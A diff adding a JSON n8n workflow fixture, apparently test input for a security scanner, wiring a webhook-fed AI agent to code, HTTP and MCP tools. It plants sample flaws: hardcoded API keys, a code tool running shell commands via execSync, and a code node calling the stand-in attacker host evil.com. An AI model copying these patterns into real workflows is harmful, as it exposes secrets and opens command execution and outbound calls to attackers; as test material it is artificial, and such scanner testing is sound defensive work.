@@ -1,0 +1,118 @@
+{
+  "name": "AI Agent with Tools",
+  "id": "test-workflow-001",
+  "nodes": [
+    {
+      "type": "n8n-nodes-base.webhook",
+      "name": "Webhook Trigger",
+      "parameters": {
+        "path": "ai-agent",
+        "httpMethod": "POST"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.agent",
+      "name": "AI Agent",
+      "parameters": {
+        "text": "={{$json.body.prompt}}"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.lmChatOpenAi",
+      "name": "OpenAI Chat Model",
+      "parameters": {
+        "model": "gpt-4",
+        "temperature": 0.7
+      },
+      "credentials": {
+        "openAiApi": {
+          "id": "1",
+          "name": "OpenAI"
+        }
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.lmChatAnthropic",
+      "name": "Anthropic Model",
+      "parameters": {
+        "model": "claude-2.1",
+        "apiKey": "sk-ant-abc123def456ghi789jkl"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.toolCode",
+      "name": "Code Tool",
+      "parameters": {
+        "jsCode": "const { execSync } = require('child_process');\nreturn execSync('ls').toString();"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.toolHttpRequest",
+      "name": "HTTP Tool",
+      "parameters": {
+        "url": "https://api.example.com/data"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.mcpClientTool",
+      "name": "MCP Client",
+      "parameters": {
+        "sseEndpoint": "https://remote-mcp.example.com/sse"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.embeddingsOpenAi",
+      "name": "OpenAI Embeddings",
+      "parameters": {
+        "model": "text-embedding-ada-002"
+      }
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.vectorStorePinecone",
+      "name": "Pinecone Store",
+      "parameters": {}
+    },
+    {
+      "type": "@n8n/n8n-nodes-langchain.memoryBufferWindow",
+      "name": "Buffer Memory",
+      "parameters": {}
+    },
+    {
+      "type": "n8n-nodes-base.httpRequest",
+      "name": "HTTP Request",
+      "parameters": {
+        "url": "https://api.openai.com/v1/completions",
+        "headers": {
+          "Authorization": "Bearer sk-proj-abcdefghijklmnopqrstuvwxyz123456"
+        }
+      }
+    },
+    {
+      "type": "n8n-nodes-base.code",
+      "name": "Custom Code",
+      "parameters": {
+        "jsCode": "const http = require('http');\nhttp.request('http://evil.com', (res) => {});"
+      }
+    }
+  ],
+  "connections": {
+    "Webhook Trigger": {
+      "main": [
+        [{ "node": "AI Agent", "type": "main", "index": 0 }]
+      ]
+    },
+    "AI Agent": {
+      "main": [
+        [
+          { "node": "Code Tool", "type": "main", "index": 0 },
+          { "node": "HTTP Tool", "type": "main", "index": 0 }
+        ]
+      ]
+    },
+    "OpenAI Chat Model": {
+      "main": [
+        [{ "node": "AI Agent", "type": "main", "index": 0 }]
+      ]
+    }
+  }
+}
